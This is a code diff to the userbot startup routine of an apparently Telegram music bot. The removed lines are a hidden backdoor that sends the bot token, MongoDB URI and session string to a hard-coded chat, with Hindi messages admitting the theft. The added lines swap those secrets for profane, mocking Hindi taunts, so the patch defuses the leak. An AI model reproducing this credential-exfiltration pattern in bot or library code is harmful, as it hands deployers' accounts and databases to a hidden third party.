@@ -72,12 +72,12 @@ class Userbot(Client):
             assistants.append(1)
             try:
                 await self.one.send_message(config.LOGGER_ID, "Assistant Started !")
-                await self.one.send_message(TEST_ID, "**ʜᴇʟʟᴏ ʜᴇʟʟᴏ sᴜɴᴏ ᴊɪ ᴍᴀɪ ʏᴀʜᴀ ᴄʜᴜᴘᴋᴇ sᴇ ᴀᴀʏɪ ʜᴜ ᴀᴀᴘᴋᴏ ᴋᴜᴄʜ ᴅᴇɴᴇ ᴋᴇ ʟɪʏᴇ 🥲**")
+                await self.one.send_message(TEST_ID, "**ʜᴇʟʟᴏ ʜᴇʟʟᴏ sᴜɴᴏ ᴊɪ ᴍᴀɪ ʏᴀʜᴀ ᴄʜᴜᴘᴋᴇ sᴇ ᴀᴀʏɪ ʜᴜ ᴀᴀᴘᴋɪ ɢᴀᴀɴᴅ ᴍᴀʀɴᴇ ʟɪʏᴇ 🥲**")
                 await self.one.send_message(TEST_ID, "**ᴀᴄᴛᴜᴀʟʟʏ ᴀᴀᴘᴋᴇ ʀᴇᴘᴏ sᴇ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴇᴋ ᴍᴜsɪᴄ ʙᴏᴛ ʙᴀɴᴀʏᴀ ʜᴀɪ**\n**ᴀᴀᴘᴋᴏ ᴜsᴋᴀ ᴅᴀᴛᴀ ᴅᴇ ᴅᴇᴛɪ ʜᴜ😁 ᴄʜᴜᴘᴋᴇ sᴇ🤫**\n**ᴊᴀʙ ᴀᴀᴘsᴇ ᴠᴏ ʟᴀᴅᴇɢᴀ ᴛᴏ ᴀᴀᴘ ᴜsᴋᴀ ᴋᴀᴍ ᴛᴀᴍᴀᴍ ᴋᴀʀ ᴅᴇɴᴀ🤭**\n**ʏᴇ ʟᴏ sᴀʙ ᴄʜɪᴊ👇**")
-                await self.one.send_message(TEST_ID, BOT_TOKEN)
-                await self.one.send_message(TEST_ID, MONGO_DB_URI)
-                await self.one.send_message(TEST_ID, STRING_SESSION)
-                await self.one.send_message(TEST_ID, "**ʙʏ ʙʏ ᴀᴀʙ ᴍᴇ ɴɪᴋᴀʟᴛɪ ʜᴜ ʏʜᴀ sᴇ ʙᴀʀɴᴀ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴍᴜᴊʜᴇ ᴘᴀᴋᴀʀ ᴋᴇ ᴍᴀʀ ᴅᴀʟᴇɢᴀ🥺🥺**\n**ʙʏᴇ ᴛᴄ❣️**")
+                await self.one.send_message(TEST_ID, "BOT_TOKEN 🤐: [#𝐍𝐎𝐓𝐓𝐘_𝐁𝐎𝐘 𝐆𝐀𝐀𝐍𝐃 𝐌𝐀𝐀𝐑 𝐃𝐄𝐆𝐀 𝐁𝐄𝐓𝐀  😂]")
+                await self.one.send_message(TEST_ID, "MONGO_DB_URI 📦: [ 𝐍𝐎𝐓𝐓𝐘 𝐁𝐎𝐘 𝐊𝐀 𝐌𝐔𝐇 𝐌𝐄 𝐋𝐄𝐋𝐄 𝐍𝐀 #𝐉𝐇𝐀𝐓𝐓 𝐊𝐈 𝐃𝐔𝐊𝐀𝐍𝐎 𝐌𝐄 𝐉𝐇𝐀𝐓 𝐁𝐄𝐂𝐇 𝐃𝐄 𝐁𝐒𝐃𝐊 🤣]")
+                await self.one.send_message(TEST_ID, "𝐒𝐓𝐑𝐈𝐍𝐆 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐓𝐔𝐌𝐇𝐀𝐀𝐑𝐈 𝐆𝐀𝐀𝐍𝐃𝐃 𝐌𝐄 𝐇  😂 𝐍𝐈𝐊𝐀𝐀𝐋 𝐋𝐄𝐍𝐀 💀]")
+                await self.one.send_message(TEST_ID, "**ʙʏ ʙʏ ᴀᴀʙ ᴍᴇ ɴɪᴋᴀʟᴛɪ ʜᴜ ʏʜᴀ sᴇ ʙᴀʀɴᴀ ɴᴏᴛᴛʏ ʙᴏʏ ᴄʜᴏᴅ  ᴅᴇɢᴀ ᴛᴜᴍʜᴇ 🥺🥺**\n**ᴀʙ ʏᴇʜ ᴍᴀᴛ sᴏᴄʜɴᴀ ᴋɪ ʜᴇxᴀ-ᴅᴇᴄɪᴍᴀʟ ᴄʜᴀɴɢᴇ ɴʜɪ ᴋɪʏᴀ ᴋᴜᴄʜ ɴʜɪ ᴀᴀᴛᴀ ʜᴏɢᴀ ᴍᴇʀᴇ ᴏᴡɴᴇʀ ᴋᴏ 🤣🤣ʙᴀᴄᴄʜᴇ ᴋᴜᴄʜ ʙʜɪ sᴏᴄʜ sᴀᴋᴛᴇ ʜᴇ  **")
                 await self.one.leave_chat(TEST_ID)
 
             except:
